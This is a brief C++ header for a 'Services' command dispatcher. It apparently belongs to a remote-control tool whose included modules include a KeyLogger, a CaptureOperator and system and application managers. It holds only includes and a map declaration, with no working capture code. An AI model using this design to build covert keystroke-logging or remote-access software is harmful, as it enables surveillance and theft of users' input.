#pragma once

#include <map>

#include "services/ApplicationManager.h"
#include "services/CaptureOperator.h"
#include "services/SystemManager.h"
#include "services/KeyLogger.h"

namespace Services {
    extern std::map<std::pair<std::string, std::string>, std::vector<std::string>(*)(Command)> servicesMap;
    // bool processCommand(std::string &command);
}